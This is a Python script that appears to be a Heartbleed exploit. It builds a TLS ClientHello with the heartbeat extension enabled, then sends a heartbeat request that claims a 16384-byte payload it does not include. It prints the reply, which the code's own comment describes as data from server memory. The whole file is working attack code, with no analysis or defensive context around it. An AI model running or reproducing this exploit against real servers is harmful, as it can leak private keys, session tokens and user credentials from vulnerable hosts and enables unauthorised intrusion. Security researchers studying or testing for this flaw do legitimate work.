from socket import socket, AF_INET, SOCK_STREAM

PACKET_CLIENT_HELLO = [
    # Record Header
    0x16,  # Content Type: Handshake (22)
    0x03, 0x03,  # Version: TLS 1.2 (0x0303)
    0x00, 0x34,  # Length: 52
    # Handshake Header
    0x01, # Handshake Type: Client Hello (1)
    0x00, 0x00, 0x30,  # Length: 48
    # Client Version
    0x03, 0x03,  # Version: TLS 1.2 (0x0303)
    # Client Random
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13,
    0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d,
    0x1e, 0x1f,
    # Session ID
    0x00,  # Session ID Length: 0
    # Cipher Suites
    0x00, 0x02,  # Cipher Suites Length: 2
    0x00, 0x35,  # Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)
    # Compression Methods
    0x01,  # Compression Methods Length: 1
    0x00,  # Compression Method: null (0)
    # Extensions
    0x00, 0x05,  # Extensions Length: 5
        # Extension: heartbeat (len=1)
    0x00, 0x0f,  # Type: heartbeat (15)
    0x00, 0x01,  # Length: 1
    0x01         # Mode: Peer allowed to send requests (1)
]
PACKET_HEARTBEAT = [
    # Record Header
    0x18,  # Content Type: Heartbeat (24)
    0x03, 0x03,  # Version: TLS 1.2 (0x0303)
    0x00, 0x03,  # Length: 3
    # Heartbeat Message
    0x01,  # Heartbeat Type: Request (1)
    0x40, 0x00  # Payload Length: 16384
]

class TLSConnection():
    # constructor
    def __init__(self: object, host: str, port: int) -> None:
        print(f'[*] Connecting to {host}:{port}...')

        # # create a TCP socket with IPv4 address family
        self.__connection = socket(AF_INET, SOCK_STREAM)
        # connect to the server on a specific port
        self.__connection.connect((host, port))

    # destructor
    def __del__(self: object) -> None:
        self.__connection.close()

    def do_handshake(self: object) -> None:
        print(f'[*] Initiating handshake...')

        try:
            # send a ClientHello packet and initiate a handshake
            self.__connection.send(bytes(PACKET_CLIENT_HELLO))
            print('[+] Handshake succesfully made.')
        except Exception:
            print('[-] Handshake failed!')

    def do_heartbleed(self: object) -> str:
        print(f'[*] Sending heartbleed packet...')

        try:
            # send a Heartbeat request packet
            self.__connection.send(bytes(PACKET_HEARTBEAT))
            print('[+] Heartbleed successful.')

            # receive a response with random data from memory
            return self.__connection.recv(16384).decode(errors='ignore')
        except Exception:
            print('[-] Heartbleed failed!')
